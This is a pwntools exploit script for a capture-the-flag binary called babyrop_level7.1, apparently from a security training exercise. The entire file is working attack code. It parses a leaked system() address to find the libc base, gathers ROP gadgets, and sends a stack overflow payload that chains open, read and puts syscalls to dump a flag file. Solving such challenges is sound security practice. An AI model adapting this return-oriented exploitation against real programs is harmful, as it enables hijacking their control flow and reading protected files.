from pwn import *
import time 

binary = './babyrop_level7.1_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
p = process(binary)

p.recvuntil(b"The address of \"system\" in libc is: ")
system_addr = int(p.recvuntil(b".").strip(b"."), 16)

system_offset = 0x52290
libc_base = system_addr - system_offset



rop = ROP(libc)
syscall = libc_base + rop.find_gadget(['syscall', 'ret']).address
#pop_rdx = libc_base + 0x00000000000dfc12
pop_rdx_r12 = libc_base + 0x0000000000119431
pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret']).address
pop_rdi = libc_base + 0x0000000000023b6a
pop_rsi = libc_base + rop.find_gadget(['pop rsi', 'ret']).address
ret = 0x000000000040101a


f_string_addr = next(elf.search(b'f\0'))
print(f"Found 'f\\0' at address: {hex(f_string_addr)}")



gdb.attach(p, '''
b * challenge+100
b * free_gadgets+36
''')

flagfileString_addr = elf.bss() + 100
flag_addr = elf.bss() + 200


print(f"[+] Leaked system() address: {hex(system_addr)}")

offset = 0x50 + 8
payload = flat(
	b'A' * offset,
	
	# open
	pop_rdi,
	f_string_addr,
	pop_rsi,
	0,
	pop_rax,
	2,
	syscall,
	
	# read
	pop_rdi,
	3, # fd
	pop_rsi,
	flag_addr,
	pop_rdx_r12,
	100,
	0,
	pop_rax,
	0,
	syscall,
	
	# write
	pop_rdi,
	flag_addr,
	elf.sym['puts'],
	
)
p.send(payload)
#time.sleep(0.1)
#p.clean()
#p.send('./flag')

p.interactive()
